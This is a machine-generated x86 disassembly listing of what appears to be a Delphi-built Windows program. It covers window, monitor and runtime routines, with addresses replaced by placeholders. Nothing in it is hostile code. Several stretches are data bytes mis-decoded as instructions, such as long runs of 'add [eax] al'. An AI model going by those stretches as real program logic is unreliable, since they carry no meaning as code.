mov eax [ ebp - 0x4 ]
call sub_42496c
retn
mov esp ebp
pop ebp
retn
sub_424b7e
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402754
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403164
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_424960
xor eax eax
push ebp
push sub_424b77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b7e
mov eax [ ebp - 0x4 ]
call sub_42496c
retn
mov esp ebp
pop ebp
retn
sub_424ba4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41f034
push eax
mov eax ebx
call sub_41f034
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_424978
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_424bdc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424ca5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424cac
retn
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
call sub_403164
call sub_421cf4
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404918
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404918
sub_424cb0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4247b4
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_424830
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e7ec
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e7ec
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e7ec
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4248fc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416d2c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416d2c
mov [ rw-data ] eax
mov ecx sub_41f044
mov edx sub_41f054
mov eax [ sub_41dab4 ]
call sub_4164e0
mov ecx r-xdata
mov edx sub_41f25c
mov eax [ r-xdata ]
call sub_4164e0
sub_424dbc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424de1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424de8
retn
sub_424df8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
dec esi
inc edx
add [ eax + eax ] dl
add [ eax ] al
mov al 0x47
inc ecx
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
pushfd
imul eax [ ecx ] sub_416b40
jl r-xdata
xor eax [ eax ]
pushfd
xor eax [ eax ]
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ eax + edx * 2 ] al
inc edx
add al dh
imul eax [ ecx ] sub_416a6c
or edx [ edi + ecx * 2 + 0x62 ]
push 0x65
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x4f
inc edx
add [ eax + 0x48004029 ] ah
push eax
inc edx
add [ eax + edx * 2 ] dh
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
test al 0x4e
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 2 + 0x80042 ] dh
add [ eax ] al
call 0xffffffff94428e99
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
add al 0x50
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
inc edx
add [ eax ] cl
add [ eax ] al
add [ esi + ecx * 2 + 0x42 ] bl
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
add al 0x50
inc edx
add [ eax + 0x50 ] ch
inc edx
add [ eax + 0x50 ] cl
inc edx
add [ eax + edx * 2 ] dh
inc edx
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0x1000408d
dec edi
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 ] bl
mov ecx ebx
mov edx edi
mov eax esi
call sub_416d28
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403164
sub_424f24
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403134
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_424f7c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_416d28
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403164
sub_424fc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403134
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_425004
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403154
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_425048
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_416a08
mov eax esi
pop esi
pop ebx
retn
sub_425074
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_425099
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4250a0
retn
sub_425168
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42518d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425194
retn
sub_4251a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40434c
xor eax eax
push ebp
push sub_42525f
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425266
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40435c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4251a0
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403e9c
sub_425288
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_4251a0
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_425310
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_4251a0
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_4253a0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_4251a0
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_425310
sub_425436
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_4251a0
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_4254b7
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_4251a0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4255a4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_4251a0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_425678
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_4251a0
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42574c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_4251a0
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4258e7
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42590d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425914
retn
sub_425928
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42594d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425954
retn
sub_425960
pop ecx
inc edx
add [ edi ] cl
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
pop esp
adc [ eax ] eax
add [ eax - 0x6d ] ebx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425954
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
pop ebx
inc edx
add [ eax + eax ] cl
add [ eax ] al
pop eax
outsd
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0x59cc7265
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
call eax
pop ecx
inc edx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x115c7265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
pop ecx
jns r-xdata
add [ eax - 0x63ffbfcd ] ch
xor eax [ eax ]
cld
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
outsb
je r-xdata
add al 0x0
mov al 0xe
pop edi
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
pop edx
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x42599cc0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc eax
add [ ebx + esi + 0x33a00040 ] dl
inc eax
add [ ebx + esi + 0x33a80040 ] ah
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
push esp
xor [ eax ] eax
adc al 0x45
dec eax
insb
jo r-xdata
add [ eax + 0x6f ] bl
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4266f3
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x5a087265
inc edx
add [ ecx ] al
xchg bx ax
cld
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] dl
add [ eax * 2 + 0x706c6548 ] dl
push ebx
inc eax
add ah bh
outsb
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x425a88c0 ]
pop edx
inc edx
add bh bh
dec [ eax + 0x5a ]
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
pop ecx
insd
pop esp
adc [ eax ] eax
add [ ebx - 0x6d ] edx
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x425a0cc0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ef0
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
imul ebp [ edi + 0x6e ] 0x6c00408d
pop ebx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 2 + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x5b ] bh
inc edx
add [ eax + eax ] cl
add [ eax ] al
call 0xffffffff94429b5d
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
jae r-xdata
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
call sub_4038d8
jmp r-xdata
int3
mov eax eax
lea eax [ eax ]
or [ ebx + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x5b080040 ]
inc edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4266fa
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404918
lea eax [ ebp - 0x8 ]
call sub_40575c
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057a0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_424f60
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405774
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4057a0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_425d24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_425d9a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_425eb0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405774
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425da1
lea eax [ ebp - 0x8 ]
call sub_40575c
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_425e3c
mov [ rw-data ] eax
sub_425da8
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_425e3c
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4057a0
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_425e00
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405774
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_425e3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403134
mov dl 0x1
mov eax [ r-xdata ]
call sub_424f24
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424f24
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424f24
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403e9c
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_425eb0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_425fb1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_425e00
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_424f74
